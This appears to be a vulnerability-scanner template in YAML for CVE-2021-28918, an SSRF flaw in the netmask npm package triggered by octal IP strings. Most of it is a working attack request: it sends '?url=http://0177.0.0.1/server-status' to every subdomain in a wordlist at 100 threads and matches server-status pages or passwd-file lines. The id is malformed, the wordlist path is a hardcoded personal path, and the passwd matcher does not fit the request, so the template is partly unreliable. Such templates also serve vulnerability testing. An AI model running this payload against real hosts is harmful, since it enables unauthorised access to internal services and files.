id: CVE-2021-28918 1
info:
  author: johnjhacking
  description: Improper input validation of octal strings in netmask npm package allows
    unauthenticated remote attackers to perform indeterminate SSRF, RFI, and LFI attacks
    on many of the dependent packages. A remote unauthenticated attacker can bypass
    packages relying on netmask to filter IPs and reach critical VPN or LAN hosts.
  name: Netmask NPM Package SSRF
  reference:
  - https://github.com/sickcodes/security/blob/master/advisories/SICK-2021-011.md
  - https://nvd.nist.gov/vuln/detail/CVE-2021-28918
  - https://github.com/advisories/GHSA-pch5-whg9-qr2r
  severity: critical
  tags: cve,cve2021,npm,netmask,ssrf,lfi
requests:
- attack: sniper
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - Apache Server Status
    - Server Version
  - regex:
    - 'root:.*:0:0:'
    type: regex
  matchers-condition: or
  payloads:
    Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
  raw:
  - 'GET /?url=http://0177.0.0.1/server-status HTTP/1.1

    Host: {{Subdomains}}

    '
  threads: 100
